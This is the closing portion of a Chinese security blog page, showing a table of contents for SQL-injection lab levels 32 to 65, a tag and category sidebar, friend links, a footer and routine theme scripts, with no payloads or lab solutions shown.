class="toc-link" href="#Less-32"><span class="toc-number">32.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-33"><span class="toc-number">33.</span> <span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-34"><span class="toc-number">34.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-35"><span class="toc-number">35.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-36"><span class="toc-number">36.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-37"><span class="toc-number">37.</span> <span class="toc-text">Less-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-38-Stacked-injection"><span class="toc-number">38.</span> <span class="toc-text">Less-38 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-39-Stacked-injection"><span class="toc-number">39.</span> <span class="toc-text">Less-39 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-40-Stacked-injection"><span class="toc-number">40.</span> <span class="toc-text">Less-40 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-41-Stacked-injection"><span class="toc-number">41.</span> <span class="toc-text">Less-41 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-42-Stacked-injection"><span class="toc-number">42.</span> <span class="toc-text">Less-42 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-43-Stacked-injection"><span class="toc-number">43.</span> <span class="toc-text">Less-43 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-44-Stacked-injection"><span class="toc-number">44.</span> <span class="toc-text">Less-44 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-45-Stacked-injection"><span class="toc-number">45.</span> <span class="toc-text">Less-45 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-46-order-by-后的注入"><span class="toc-number">46.</span> <span class="toc-text">Less-46 order by 后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-47-order-by-后的注入"><span class="toc-number">47.</span> <span class="toc-text">Less-47 order by 后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-48-order-by后的注入"><span class="toc-number">48.</span> <span class="toc-text">Less-48 order by后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-49-order-by后的注入"><span class="toc-number">49.</span> <span class="toc-text">Less-49 order by后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-50-order-by-stacked-injection"><span class="toc-number">50.</span> <span class="toc-text">Less-50 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-51-order-by-stacked-injection"><span class="toc-number">51.</span> <span class="toc-text">Less-51 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-52-order-by-stacked-injection"><span class="toc-number">52.</span> <span class="toc-text">Less-52 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-53-order-by-stacked-injection"><span class="toc-number">53.</span> <span class="toc-text">Less-53 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-54"><span class="toc-number">54.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-55"><span class="toc-number">55.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-56"><span class="toc-number">56.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-57"><span class="toc-number">57.</span> <span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-58"><span class="toc-number">58.</span> <span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-59"><span class="toc-number">59.</span> <span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-60"><span class="toc-number">60.</span> <span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-61"><span class="toc-number">61.</span> <span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-62"><span class="toc-number">62.</span> <span class="toc-text">Less-62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-63"><span class="toc-number">63.</span> <span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-64"><span class="toc-number">64.</span> <span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-65"><span class="toc-number">65.</span> <span class="toc-text">Less-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">66.</span> <span class="toc-text">参考资料</span></a></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>26</sup></a></li>
		  
		
		  
			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>17</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/docker/" title="docker">docker<sup>6</sup></a></li>
			
		
			
				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/python/" title="python">python<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/redis/" title="redis">redis<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/PE/" title="PE">PE<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/安恒杯Web安全测试大赛/" title="安恒杯Web安全测试大赛">安恒杯Web安全测试大赛<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/流量混淆/" title="流量混淆">流量混淆<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Reverse/" title="Reverse">Reverse<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/cve-2019-0708/" title="cve_2019_0708">cve_2019_0708<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://blog.scanxx.com/" target="_blank" title="scanxx">scanxx</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.ccdebug.com/" target="_blank" title="ccdebug">ccdebug</a>
            
          </li>
        
          <li>
            
            	<a href="https://y-y-k.tk/" target="_blank" title="y-y-k">y-y-k</a>
            
          </li>
        
          <li>
            
            	<a href="https://0clickjacking0.github.io/" target="_blank" title="xianyu123">xianyu123</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.virtua1.cn" target="_blank" title="Virtua1">Virtua1</a>
            
          </li>
        
          <li>
            
            	<a href="http://v0w.top" target="_blank" title="V0W">V0W</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
            
          </li>
        
          <li>
            
            	<a href="http://p0desta.com" target="_blank" title="p0desta">p0desta</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.test407.cn" target="_blank" title="薯片博客">薯片博客</a>
            
          </li>
        
          <li>
            
            	<a href="https://alem0n.github.io" target="_blank" title="lem0n">lem0n</a>
            
          </li>
        
    </ul>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	
	<section class="info">
		<p> Rise and rise again until lambs become lions <br/>
			Everyone can cook, but only those who dare to try can become the real chef.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		
		<a href="https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
		
		<a href="/about" target="_blank" title="flag0">flag0</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>











<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
